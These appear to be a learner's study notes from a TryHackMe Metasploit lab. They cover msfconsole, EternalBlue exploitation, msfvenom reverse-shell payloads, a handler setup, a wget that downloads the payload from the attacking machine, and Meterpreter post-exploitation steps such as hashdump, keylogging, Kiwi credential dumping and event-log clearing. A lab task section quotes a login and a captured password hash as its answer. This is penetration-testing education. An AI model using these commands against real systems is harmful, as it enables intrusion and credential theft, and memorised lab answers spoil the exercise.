# Metasploit
<p align="center">
<img src="https://user-images.githubusercontent.com/73976100/222862293-3c5403ac-f7f7-4385-8a15-4d274a885d41.png" width="300">
</p>

### Main Componets of Metasploit  
`msfconsole`  
- Exploit: A piece of code that uses a vulnerability present on the target system.
- Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
- Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.  
<br>

`/metasploit-framework/modules`  
- Auxiliary: Any supporting module, such as scanners, crawlers and fuzzers, can be found here.  
- Encoders: Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
- Evasion: While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software.
- Exploits: Exploits, neatly organized by target system.
- NOPs: NOPs (No OPeration) do nothing, literally.
- Payloads: Payloads are codes that will run on the target system.
    - Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
    - Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
    - Stages: Downloaded by the stager. This will allow you to use larger sized payloads.
- Post: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.  

### Msfconsole

`use`  
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```  
`show options`: show context set  
`show payloads`: show  list available modules in the context
`back`: leave the context  
`info`: information in the context (`info exploit/windows/smb/ms17_010_eternalblue`)  
<br>  

`search`  
```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-
```  
You can use any module returned in a search result with the command use followed by the number at the beginning of the result line. (e.g. `use 0` instead of `use auxiliary/admin/smb/ms17_010_command`)  

<img src="https://user-images.githubusercontent.com/73976100/222870889-cbb16361-7699-4ef4-be9b-bbef1479dd61.png" width="800">  

You can direct the search function using keywords such as type and platform.  
`search type:auxiliary telnet`  
`search rank:excellent telnet`  
<br>  

`set PARAMETER_NAME VALUE`: All parameters are set using the same command  

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.165.39
rhosts => 10.10.165.39
```  

Parameters:  
- RHOSTS: “Remote host”, the IP address of the target system. A single IP address or a network range can be set. CIDR (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y) support.  list support. file:/path/of/the/target_file.txt  
    <img src="https://user-images.githubusercontent.com/73976100/222873145-dcde2b37-2cdb-43a2-8757-ee2bc80c5e43.png" width="1000">  
- RPORT: “Remote port”, the port on the target system the vulnerable application is running on.
- PAYLOAD: The payload you will use with the exploit.
- LHOST: “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.
- LPORT: “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
- SESSION: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.  

`unset`: clear any parameters  
```
msf5 exploit(windows/smb/ms17_010_eternalblue) > unset all
Flushing datastore...
```  

`setg` and `unsetg`: set (unset) values that will be used for all modules  

#### Using modules  
`exploit`: launch the module  
`run`: alias created for the `exploit` command as the word exploit did not make sense when using modules that were not exploits (port scanners, vulnerability scanners, etc.)  
`-z`: background the session as soon as it opens  
`-check`: check if the target system is vulnerable without exploiting it  

#### Sessions
`background`: background the session prompt and go back to the msfconsole prompt  
```
meterpreter > background
[*] Backgrounding session 2...
msf5 exploit(windows/smb/ms17_010_eternalblue) > 
```  
`sessions`: To see the existing sessions  
`-i`: To interact with any session  
```
msf5 > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

msf5 > sessions -i 2
[*] Starting interaction with 2...

meterpreter >
```  

## Exploitation  
### Scanning  
#### Port Scanning  
`search porscan`  
You can directly perform Nmap scans from the msfconsole prompt as shown below faster:  
```
msf6 > nmap -sS 10.10.12.229
[*] exec: nmap -sS 10.10.12.229


Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-20 03:54 BST
```  

#### UDP service Identification  
`scanner/discovery/udp_sweep`: provide a quick way to identify services such as DNS or NetBIOS  

#### SMB Scans  
Especially useful in a corporate network would be `smb_enumshares` and `smb_version` but please spend some time to identify scanners that the Metasploit version installed on your system offers.  
When performing service scans, it would be important not to omit more "exotic" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers.   
`scanner/smb/smb_login`: scan user's SMB password  

### The Metasploit Database
Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.   
`systemctl start postgresql`  
`msfdb init`
```
root@attackbox:~# systemctl start postgresql 
root@attackbox:~# msfdb init
[i] Database already started
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract_adapter.rb:84: warning: deprecated Object#=~ is called on Integer; it always returns nil
```  
`db_status`: check the database status  
`workspace`: create workspaces  
`-a`: add a workspace, `-d`: delete a workspace  
```
msf6 > workspace -a tryhackme
[*] Added workspace: tryhackme
[*] Workspace: tryhackme
msf5 > workspace
default
* tryhackme
msf6 >
```  
`workspace -h`  
`help`: show the Database Backends Commands menu  
If you run a Nmap scan using the `db_nmap` shown below, all results will be saved to the database.   
```
msf6 > db_nmap -sV -p- 10.10.12.229
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-20 03:15 UTC
```  
You can now reach information relevant to hosts and services running on target systems with the `hosts` and `services` commands, respectively.   
```
msf6 > hosts
Hosts
=====

address       mac                name                                        os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----                                        -------  ---------  -----  -------  ----  --------
10.10.12.229  02:ce:59:27:c8:e3  ip-10-10-12-229.eu-west-1.compute.internal  Unknown                    device         

msf6 > services
Services
========

host          port   proto  name               state  info
----          ----   -----  ----               -----  ----
10.10.12.229  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.12.229  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.12.229  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
```  
Once the host information is stored in the database, you can use the `hosts -R` command to add this value to the RHOSTS parameter.   
<br>  

In a typical penetration testing engagement, we could have the following scenario:  
1. Finding available hosts using the `db_nmap` command
2. Scanning these for further vulnerabilities or open ports (using a port scanning module) 
<br>  

Example Workflow
1. We will use the vulnerability scanning module that finds potential MS17-010 vulnerabilities with the `use auxiliary/scanner/smb/smb_ms17_010` command.
2. We set the RHOSTS value using `hosts -R`.
3. We have typed `show options` to check if all values were assigned correctly.
4. Once all parameters are set, we launch the exploit using the `run` or `exploit` command.  

The services command used with the `-S` parameter will allow you to search for specific services in the environment.  
```
msf6 > services -S netbios                
Services                          
========                           
host          port  proto  name         state  info                                                                              
----          ----  -----  ----         -----  ----                                                                              
10.10.12.229  139   tcp    netbios-ssn  open   Microsoft Windows netbios-ssn
```  
Low-hanging fruits:  
|Query|description|
|:----:|----------|
|HTTP|Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE). |
|FTP|Could allow anonymous login and provide access to interesting files. |
|SMB|Could be vulnerable to SMB exploits like MS17-010|
|SSH|Could have default or easy to guess credentials|
|RDP|Could be vulnerable to Bluekeep or allow desktop access if weak credentials were used. |  

### Exploit
`show payloads` command to list other commands you can use with that specific exploit.  
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
```  
Once you have decided on the payload, you can use the `set payload` command to make your choice.  
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
payload => generic/shell_reverse_tcp
```

### Msfvenom  
Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.  
```
root@ip-10-10-186-44:~# msfvenom -l payloads 

Framework Payloads (562 total) [--payload ]
==================================================

    Name                                                Description
    ----                                                -----------
    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                             Spawn a shell on an established connection
    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)
```  
#### Output formats  
`msfvenom --list formats`: show list supported output formats  

#### Encorders  
`-e`: encoding  
```
root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
```  

#### Handlers  
Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload.   
- Generating a PHP reverse shell  
```
root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 3020 bytes
```  
Please note: The output PHP file will miss the starting PHP tag commented and the end tag (`?>`), as seen below.  
<img src="https://user-images.githubusercontent.com/73976100/222891696-30b3187c-c726-4ce5-8594-9923c1095376.png" width="600">  
The reverse_shell.php file should be edited to convert it into a working PHP file.   
Below: Comments removed from the beginning of the file.  
<img src="https://user-images.githubusercontent.com/73976100/222891703-47ca33eb-e06b-4dc9-bd2a-c6f3be3ffdb2.png" width="600">  
Below: End tag added  
<img src="https://user-images.githubusercontent.com/73976100/222891706-175c7fc0-bfcf-4a45-a0c9-f8b4b8f0394f.png" width="300">  
<br>

`use exploit/multi/handler`: to receive the incoming connection  
 ```
 msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload php/reverse_php
payload => php/reverse_php
msf5 exploit(multi/handler) > set lhost 10.0.2.19
lhost => 10.0.2.19
msf6 exploit(multi/handler) > set lport 7777
lport => 7777
```

####  Other Payloads
In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.  
- Linux Executable and Linkable Format (elf)  
    `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
    Make sure permissions.
- Windows  
    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
- PHP  
    `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
- ASP  
    `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
- Python  
    `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`  

<details>
<summary>task</summary>

**Task 6: Msfvenom**
Just read the content, all you’ll get everything you want to answer the question.

#1 Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type “sudo su” to get a root shell, this will make things easier.

`ssh murphy@[MACHINE IP]`

`sudo su`

#2 Create a meterpreter payload in the .elf format.

#3 Transfer it to the target machine (you can start a Python web server on your attacking machine with the `python3 -m http.server 9000` command and use `wget http://ATTACKING_MACHINE_IP:9000/shell.elf` to download it to the target machine).

#4 Get a meterpreter session on the target machine.

To get a meterpreter reverse shell, we will make a payload so that we would run that in the user’s shell and access everything from our shell :) For the payload, type the following command in your terminal:

Linux Executable and Linkable Format (elf):

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`

An easy way of transferring the exploit in user’s shell is by using server. Let’s start a python server in that shell and request for this file:

In attacking machine:

`python3 -m http.server 9000`

In the machine being attacked:

`wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf`  

(*windows*) `wget http://ATTACKING_MACHINE_IP:9000/rev_shell.exe -O rev_shell.exe`

Now remember we need a listener on our shell for RCE:

(Type these commands in the metasploit shell)

`use exploit/multi/handler`

`set payload linux/x86/meterpreter/reverse_tcp`

Now just set the LHOST and LPORT the same you did in the exploit.
Last thing to do is run that file and recieve the connection :

`chmod +x rev_shell.elf` in the shell we have ssh the account

Start the listener in your machine by the command told above.

Run the file by `./rev_shell.elf`

You got the meterpreter reverse shell in your machine ;)

#4 Use a post exploitation module to dump hashes of other users on the system.

`msfconsole`

`run post/linux/gather/hashdump`

#5 What is the other user’s password hash?

$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0
</details>


## Meterpreter
- Run on the target system and act as an agent within a C&C architecture.   
- Run in tagrget machine memory and does not write itself to the disk (antivirus software evasion).   
- Avoid being detected by network-based IPS and IDS by using encrypted communication.
- Process(PID) is not shown as "meterpreter.exe", e.g. it's shown as "spoolsv.exe". DLLs(e.g. meterpreter.dll) isn't also shown.  
- BUT, most antivirus software will detect Meterpreter.  

### Meterpreter Flavors
`msfvenom --list payloads | grep meterpreter`  

### Upgrade Normal Shell To Meterpreter Shell
https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646  
Step 1: Background the current(Normal Shell) session, we can do this by pressing CTRL+Z  
Step 2: Now Run the following command `search shell_to_meterpreter`.  
Step 3: Use the shown module by following the command
`use post/multi/manage/shell_to_meterpreter` or by simply typing
`use 0`.  
Step 4: Now we have to configure which Session shell to upgrade. We can see the Session by running the following command i.e `sessions -l`. Id=Session-Number  
Step 5: We can see the Options, by using the `show options` command.  
Step 6: Set the session-id according to your session. We can use the following command to configure the session i.e `set SESSION <id-of session>` in my case `set SESSION 1`.  
Step 7: After you configure your session, it’s time to execute it. We can execute by simply giving the following command → `run`  
Step 8: Now execute the new session by running the following command `session -i <New-meterpeter-session>` in my case, it’s `session -i 2`  

### Meterpreter Commands  
```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel[...]
```  
- Core Commands  

|command|Description|
|:-----:|-----------|
|`background`| Backgrounds the current session|
|`exit`| Terminate the Meterpreter session|
|`guid`| Get the session GUID (Globally Unique Identifier)|
|`help`| Displays the help menu|
|`info`| Displays information about a Post module|
|`irb`| Opens an interactive Ruby shell on the current session|
|`load`| Loads one or more Meterpreter extensions|
|`migrate`| Allows you to migrate Meterpreter to another process|
|`run`| Executes a Meterpreter script or Post module|
|`sessions`| Quickly switch to another session|  

- File system commands  

|command|Description|
|:-----:|-----------|
|`cd`| Will change directory|
|`ls`| Will list files in the current directory (dir will also work)|
|`pwd`| Prints the current working directory|
|`edit`| will allow you to edit a file|
|`cat`| Will show the contents of a file to the screen|
|`rm`| Will delete the specified file|
|`search`| Will search for files|
|`upload`| Will upload a file or directory|
|`download`| Will download a file or directory|  

- Networking commands

|command|Description|
|:-----:|-----------|
|`arp`| Displays the host ARP (Address Resolution Protocol) cache|
|`ifconfig`| Displays network interfaces available on the target system|
|`netstat`| Displays the network connections|
|`portfwd`| Forwards a local port to a remote service|
|`route`| Allows you to view and modify the routing table|  

- System commands

|command|Description|
|:-----:|-----------|
|`clearev`| Clears the event logs|
|`execute`| Executes a command|
|`getpid`| Shows the current process identifier|
|`getuid`| Shows the user that Meterpreter is running as|
|`kill`| Terminates a process|
|`pkill`| Terminates processes by name|
|`ps`| Lists running processes|
|`reboot`| Reboots the remote computer|
|`shell`| Drops into a system command shell|
|`shutdown`| Shuts down the remote computer|
|`sysinfo`| Gets information about the remote system, such as OS|  

- Others Commands (these will be listed under different menu categories in the help menu)  

|command|Description|
|:-----:|-----------|
|`idletime`| Returns the number of seconds the remote user has been idle|
|`keyscan_dump`| Dumps the keystroke buffer|
|`keyscan_start`| Starts capturing keystrokes|
|`keyscan_stop`| Stops capturing keystrokes|
|`screenshare`| Allows you to watch the remote user's desktop in real time|
|`screenshot`| Grabs a screenshot of the interactive desktop|
|`record_mic`| Records audio from the default microphone for X seconds|
|`webcam_chat`| Starts a video chat|
|`webcam_list`| Lists webcams|
|`webcam_snap`| Takes a snapshot from the specified webcam|
|`webcam_stream`| Plays a video stream from the specified webcam|
|`getsystem`| Attempts to elevate your privilege to that of local system|
|`hashdump`| Dumps the contents of the SAM database|

### Post-Exploitation with Meterpreter  
`help`: list of all available commands in Meterpreter  
`getuid`: display the user with which Meterpreter is currently running  
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```  
`ps`: list of running processes  
```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           
```  
`migrate`: Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the `keyscan_start`, `keyscan_stop`, and `keyscan_dump` command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.  
Good target process for migrating is `upnpcont.exe`.  
```
meterpreter > shell
C:\Windows\system32>c:\windows\system32\upnpcont.exe
[ctrl+z]
meterpreter > ps
PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
716  3040  upnpcont.exe          x64   0        NT AUTHORITY\SYSTEM           c:\windows\system32\upnpcont.exe
```
```
meterpreter > migrate 716
[*] Migrating from 1304 to 716...
[*] Migration completed successfully.
```  
`hashdump`: list the content of the SAM database  
Sometimes, it is to need migrate to `lsass.exe` PID.  
```
meterpreter > ps
meterpreter > migrate 776
[*] Migrating from 3684 to 776...
[*] Migration completed successfully.
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```  
`search`: locate files with potentially juicy information  
```
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
```  
`shell`: launch a regular command-line shell on the target system. Pressing `CTRL+Z` will help you go back to the Meterpreter shell.  
```
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```  
`load`: leverage additional tools such as Kiwi or even the whole Python language  
```
meterpreter > load python
Loading extension python...Success.
meterpreter > python_execute "print 'TryHackMe Rocks!'"
[+] Content written to stdout:
TryHackMe Rocks!
```
```
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS >
```   
```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```  
<details>
<summary>Kiwi commands</summary>

```
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
    kiwi_cmd               Execute an arbitary mimikatz command (unparsed)
    lsa_dump_sam           Dump LSA SAM (unparsed)
    lsa_dump_secrets       Dump LSA secrets (unparsed)
    password_change        Change the password/hash of a user
    wifi_list              List wifi profiles/creds for the current user
    wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM)
```  

</details>





